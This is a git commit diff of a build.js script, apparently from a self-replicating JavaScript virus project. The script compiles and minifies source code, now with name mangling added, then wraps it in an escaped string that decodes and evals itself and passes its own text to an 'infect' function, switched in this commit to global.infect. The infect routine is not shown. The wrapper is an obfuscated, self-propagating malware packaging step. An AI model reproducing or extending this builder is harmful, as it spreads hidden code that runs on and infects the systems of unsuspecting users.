72ddec1200d4411edcc5fd480a099cb88dac9ae9
Tim Lonsdale <maambmb@Tims-MBP.lan>
2017-06-13 22:10:47 +0100

    tidy

--- build.js
+++ build.js
@@ -15,14 +15,14 @@ async function build() {
 
     await fs.ensureDir( ".build" );
     await exec( `cat ${src} | ./node_modules/.bin/babel -o ${compiled} --presets es2015` );
-    await exec( `./node_modules/.bin/uglifyjs --compress -o ${minified} ${compiled}` );
+    await exec( `./node_modules/.bin/uglifyjs --mangle --compress -o ${minified} ${compiled}` );
 
     var raw = await fs.readFile( minified, "utf-8" );
     await fs.writeFile( tgt, `(function() {
         var payload = "${ escape( raw ) }";
         var decoded = decodeURI(payload);
         eval(decoded);
-        infect(payload);
+        global.infect(payload);
     })();` );
 }
 
